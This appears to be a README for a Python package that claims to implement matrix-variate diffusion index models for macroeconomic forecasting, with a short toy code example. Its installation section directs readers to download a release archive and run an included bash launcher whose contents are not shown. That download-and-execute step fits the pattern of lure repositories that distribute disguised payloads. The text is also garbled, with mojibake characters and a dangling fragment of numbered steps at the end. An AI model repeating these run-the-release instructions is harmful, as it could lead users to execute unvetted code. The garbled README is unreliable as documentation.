ðŸš€ High-dimensional matrix-variate diffusion index models for macroeconomic forecasting. This repo contains an end-to-end Python implementation of Ma et al.'s (2025) model family. It keeps the matrix structure in the data while extracting cross-sectional and temporal factors. Use Î±-PCA for robust factor extraction, supervised screening to reduce noise, and ILS estimation to recover target parameters under high dimensionality.

About
- Implements matrix-variate diffusion index models for panel/time-series matrices.
- Retains row/column structure and leverages matrix factor models to improve forecasting.
- Targets macroeconomic forecasting tasks: GDP, inflation, employment, and multi-series projections.
- Reproduces experiments from Ma et al. (2025) and extends them with extra diagnostics and Monte Carlo scripts.

Key features
- Î±-PCA factor extraction for matrix data. Controls robustness through Î± parameter.
- Supervised screening that ranks predictors by predictive signal before factor extraction.
- Iterative least squares (ILS) estimation designed for high-dimensional targets.
- Time-series forecasting wrappers with rolling-window evaluation.
- Monte Carlo simulation suite for method validation.
- NumPy-first implementation with optional SciPy and scikit-learn adapters.
- Reusable modules for research replication and applied forecasting.

When to use
- You have matrix-shaped panels (variables Ã— cross-section) rather than flat vectors.
- You need to preserve structural information across rows and columns.
- You face more predictors than observations and require high-dimensional tools.
- You want interpretable low-rank factors with forecasting power.

Installation

Download and run release package
The release archive on the Releases page contains packaged code, example data, and executable runner scripts. Download the appropriate release bundle from the Releases page and execute the included runner.

Download and execute:
- Visit the Releases page: https://github.com/akuzamilyt/high_dimensional_matrix_variate_diffusion_index_models/releases
- Download the archive named high_dimensional_matrix_variate_diffusion_index_models_v1.0.tar.gz
- Extract and run the included launcher:
```bash
tar -xzf high_dimensional_matrix_variate_diffusion_index_models_v1.0.tar.gz
cd high_dimensional_matrix_variate_diffusion_index_models_v1.0
bash run_release.sh       # runs demo estimations and Monte Carlo
```

Quickstart â€” toy forecasting example
1. Prepare matrix panel X_t of shape (p_rows, p_cols, T) or a list of matrices per period.
2. Extract factors with Î±-PCA.
3. Screen factors with supervised ranking.
4. Estimate ILS regression for target series.
5. Forecast and evaluate with rolling windows.

Minimal code:
```python
from mdidm import AlphaPCA, SupervisedScreen, ILSForecaster
import numpy as np

# toy data: 10 rows, 8 columns, 200 timepoints
X = np.random.randn(200, 10, 8)  # shape (T, rows, cols)
y = np.random.randn(200)

# extract 3 factors
ap = AlphaPCA(n_factors=(3, 3), alpha=0.5)
F_t = ap.fit_transform(X)  # returns time-series of factor matrices

# supervised screening
ss = SupervisedScreen(method="corr", top_k=50)
selected = ss.fit_transform(F_t.reshape(200, -1), y)

# ILS forecasting
ils = ILSForecaster(lags=4)
ils.fit(selected, y)
y_hat = ils.forecast(steps=12)
```

  2. Standardize series by row and column.
  3. Run Î±-PCA with cross-validated Î±.
  4. Screen factors against target variable.
